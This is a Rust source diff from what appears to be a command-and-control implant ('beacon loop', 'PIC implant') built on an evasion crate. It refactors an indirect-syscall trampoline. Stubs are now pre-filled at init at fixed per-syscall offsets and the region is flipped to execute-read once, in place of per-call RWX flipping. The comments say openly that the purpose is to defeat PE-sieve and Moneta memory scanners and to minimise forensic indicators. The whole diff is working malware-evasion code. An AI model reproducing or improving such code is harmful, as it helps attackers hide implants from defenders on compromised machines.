@@ -22,19 +22,22 @@ use crate::heap::{String, Vec};
 use crate::resolve::{djb2, LiveNtdll};
 use nyx_evasion::stub::indirect_stub;
 
+/// Fixed-size stub slot (bytes). An indirect stub is ~21 bytes; 32 gives
+/// alignment margin. Each SSN gets a dedicated slot at `trampoline + (ssn * STUB_SIZE)`.
+const STUB_SIZE: usize = 32;
+
 /// The resolved syscall runtime: SSN table + the ntdll `syscall` gadget address
-/// + a writable/executable trampoline page the indirect stubs are copied into.
+/// + a pre-populated executable trampoline region (one stub slot per SSN).
+/// Stubs are written at init time and the whole region is flipped to RX once,
+/// eliminating both the per-call VirtualProtect churn and the race condition
+/// where multi-threaded/APC contexts could overwrite another thread's stub.
 pub struct Runtime {
     /// (api name, SSN) for every resolvable syscall.
     table: Vec<(String, u32)>,
     /// Absolute address of a `syscall; ret` gadget inside ntdll.
     syscall_gadget: u64,
-    /// A single page used as the indirect-syscall trampoline. The beacon loop
-    /// is single-threaded, so one reusable page is safe. The page is PAGE_RX at
-    /// rest (not RWX — defeats PE-sieve/Moneta unbacked-RWX scans). Before each
-    /// stub write we flip to RWX via kernel32!VirtualProtect, write the stub,
-    /// then flip back to RX. The brief RWX window is transient and much harder
-    /// to fingerprint than a permanent RWX allocation.
+    /// Pre-populated trampoline region (PAGE_EXECUTE_READ after init).
+    /// Each SSN's stub lives at `trampoline + (ssn * STUB_SIZE)`.
     trampoline: *mut u8,
 }
 
@@ -106,11 +109,15 @@ impl Runtime {
             }
         };
         // fresh_guard drops here → unmaps the second ntdll view (transient IOC).
+        // Pre-allocate enough executable pages to hold one stub slot per SSN.
+        // Indirect stubs are ~21 bytes; STUB_SIZE=32 gives alignment margin.
+        // SSNs on Win10/11 range to ~500, so ~16 KiB of trampoline memory
+        // (4 pages) handles all resolved syscalls without per-call VirtualProtect
+        // or race conditions between concurrent/APC callers.
+        let max_ssn = table.iter().map(|(_, s)| *s).max().unwrap_or(0);
+        let trampoline_bytes = ((max_ssn as usize) + 1) * STUB_SIZE;
+        let trampoline_pages = (trampoline_bytes + 0xFFF) & !0xFFF;
 
-        // One page of executable memory. Starts PAGE_EXECUTE_READ (0x20) —
-        // defeats PE-sieve/Moneta unbacked-RWX scans. The trampoline_for()
-        // method flips it to RWX briefly for the stub write, then back to RX.
-        // MEM_COMMIT|MEM_RESERVE (0x3000). Resolved via the PEB walk.
         let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
         type VirtualAlloc = unsafe extern "system" fn(
             *mut core::ffi::c_void,
@@ -118,16 +125,38 @@ impl Runtime {
             u32,
             u32,
         ) -> *mut core::ffi::c_void;
-        let f: VirtualAlloc = core::mem::transmute(va);
-        let page = f(
+        let alloc: VirtualAlloc = core::mem::transmute(va);
+        // Allocate RW initially so we can write stubs, then flip to RX.
+        let page = alloc(
             core::ptr::null_mut(),
-            0x1000,
-            0x3000,
-            0x20, // PAGE_EXECUTE_READ
+            trampoline_pages,
+            0x3000,               // MEM_COMMIT | MEM_RESERVE
+            0x04,                 // PAGE_READWRITE
         );
         if page.is_null() {
             return None;
         }
+
+        // Pre-fill every stub at its fixed offset: trampoline + (ssn * STUB_SIZE).
+        for (_name, ssn) in &table {
+            let stub = indirect_stub(*ssn, syscall_gadget);
+            core::ptr::copy_nonoverlapping(
+                stub.as_ptr(),
+                (page as *mut u8).add((*ssn as usize) * STUB_SIZE),
+                stub.len(),
+            );
+        }
+
+        // Flip the entire region to PAGE_EXECUTE_READ once — no more per-call
+        // VirtualProtect flips. Uses kernel32!VirtualProtect (PEB-resolved) to
+        // avoid recursing through the indirect-syscall trampoline.
+        if let Some(vp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
+            type VpFn = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
+            let vp: VpFn = core::mem::transmute(vp_addr);
+            let mut old: u32 = 0;
+            vp(page, trampoline_pages, 0x20, &mut old);
+        }
+
         Some(Self {
             table,
             syscall_gadget,
@@ -158,13 +187,11 @@ impl Runtime {
         indirect_stub(ssn, self.syscall_gadget)
     }
 
-    /// Write the indirect stub for `ssn` into the trampoline page and return a
-    /// typed function pointer to it. Single-threaded (beacon loop only), so no
-    /// locking is needed — each call rewrites the same page before invoking.
-    ///
-    /// The page is PAGE_RX at rest; this method flips to RWX before the write
-    /// and back to RX after, so the RWX window is transient (~ns). This defeats
-    /// PE-sieve / Moneta scanners that flag permanently RWX private allocations.
+    /// Return a typed function pointer to the pre-populated stub for `ssn`.
+    /// Stubs were written at init time at fixed offsets (`trampoline + ssn * STUB_SIZE`)
+    /// and the whole region was flipped to PAGE_EXECUTE_READ once. No per-call
+    /// VirtualProtect flips, no copy, and no race condition — each SSN has its
+    /// own dedicated slot.
     ///
     /// # Safety
     /// Caller must pass a real SSN resolved from the live ntdll table, and the
@@ -172,82 +199,7 @@ impl Runtime {
     /// syscall's signature (Win64 calling convention; first 4 args in
     /// rcx/rdx/r8/r9, rest on stack).
     pub unsafe fn trampoline_for(&self, ssn: u32) -> *const u8 {
-        let stub = indirect_stub(ssn, self.syscall_gadget);
-
-        // W^X flip: RW → RWX → write → RX. Uses kernel32!VirtualProtect
-        // (PEB-resolved) to avoid recursion through the indirect-syscall
-        // trampoline (which is the page we're protecting).
-        //
-        // If VirtualProtect cannot be resolved (kernel32 corrupted/unloaded),
-        // the page stays PAGE_EXECUTE_READ and the copy below would fault.
-        // Bail early — return the trampoline address as-is (stale stub) rather
-        // than crashing with STATUS_ACCESS_VIOLATION.
-        if !unsafe { flip_to_rwx(self.trampoline as usize, stub.len()) } {
-            return self.trampoline as *const u8;
-        }
-
-        // The trampoline page is 0x1000 bytes; a stub is ~23. Always fits.
-        core::ptr::copy_nonoverlapping(stub.as_ptr(), self.trampoline, stub.len());
-
-        // Best-effort restore to RX. If flip_to_rx fails, the page stays RWX —
-        // not ideal for stealth but not a crash. The alternative (trapping) is
-        // worse for a PIC implant.
-        unsafe {
-            flip_to_rx(self.trampoline as usize, stub.len());
-        }
-
-        self.trampoline as *const u8
-    }
-}
-
-/// Flip the trampoline page (or a region of it) to PAGE_EXECUTE_READWRITE.
-/// Uses kernel32!VirtualProtect resolved via the PEB walk (not the indirect
-/// trampoline — avoids recursion). `addr` is the page base; `len` is the stub
-/// length (VirtualProtect rounds up to a page boundary anyway).
-///
-/// Returns `true` if the page was successfully flipped to RWX, `false` if
-/// VirtualProtect could not be resolved (kernel32 missing/corrupted).
-///
-/// # Safety
-/// `addr` must be the trampoline page address; `len` > 0.
-unsafe fn flip_to_rwx(addr: usize, len: usize) -> bool {
-    let Some(vp) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") else {
-        return false;
-    };
-    type VpFn = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
-    let f: VpFn = core::mem::transmute(vp);
-    let mut old: u32 = 0;
-    unsafe {
-        f(
-            addr as *mut core::ffi::c_void,
-            len,
-            0x40, // PAGE_EXECUTE_READWRITE
-            &mut old,
-        ) != 0
-    }
-}
-
-/// Flip the trampoline page back to PAGE_EXECUTE_READWRITE → PAGE_EXECUTE_READ
-/// after the stub write. Uses kernel32!VirtualProtect (PEB-resolved).
-///
-/// Returns `true` if the page was successfully flipped to RX.
-///
-/// # Safety
-/// `addr` must be the trampoline page address; `len` > 0.
-unsafe fn flip_to_rx(addr: usize, len: usize) -> bool {
-    let Some(vp) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") else {
-        return false;
-    };
-    type VpFn = unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
-    let f: VpFn = core::mem::transmute(vp);
-    let mut old: u32 = 0;
-    unsafe {
-        f(
-            addr as *mut core::ffi::c_void,
-            len,
-            0x20, // PAGE_EXECUTE_READ
-            &mut old,
-        ) != 0
+        unsafe { self.trampoline.add((ssn as usize) * STUB_SIZE) as *const u8 }
     }
 }
 
